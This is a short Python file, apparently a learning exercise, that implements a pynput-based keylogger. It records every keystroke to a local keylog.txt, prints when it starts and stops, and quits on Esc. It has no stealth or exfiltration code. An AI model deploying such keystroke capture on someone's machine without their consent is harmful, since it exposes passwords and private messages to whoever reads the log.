from pynput import keyboard
from datetime import datetime
import threading # tools to run multiple operations concurrently
import time # it handles delays and timing

class KeyLogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.listener = None # not listener yet
        self.isRunning = False # tracks when keylog is running
    
    def _on_press(self, key): # _name is the convention for private methods
        try:
            char = key.char
        except AttributeError:
            char = self._translate_special_key(key)

        with open(self.log_file, "a") as f:
            f.write(char)


    def _translate_special_key(self, key):
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]\n",
            keyboard.Key.tab: "[TAB]\n",
            keyboard.Key.backspace: "[BACKSPACE]\n",
        }

        return special_keys.get(key, f"[{key}]") # second param handles unmapped keys


    def _on_release(self, key):
        if key == keyboard.Key.esc:
            self.stop()
            return False
        
    def start(self):
        self.isRunning = True
        self.listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        )
        self.listener.start() # no blocking start
        print(f"Keylogger started. Logging to {self.log_file}")


    def stop(self):
        if self.listener:
            self.listener.stop()
        self.isRunning = False
        print("Keylogger stopped")

if __name__ == "__main__":
    logger = KeyLogger()
    logger.start()

    # simulation of work while keylogger runs
    try:
        while logger.isRunning:
            print("Main program doing other things ...")
            time.sleep(10) # pauses the execution for 10 seconds
    except KeyboardInterrupt:
        logger.stop()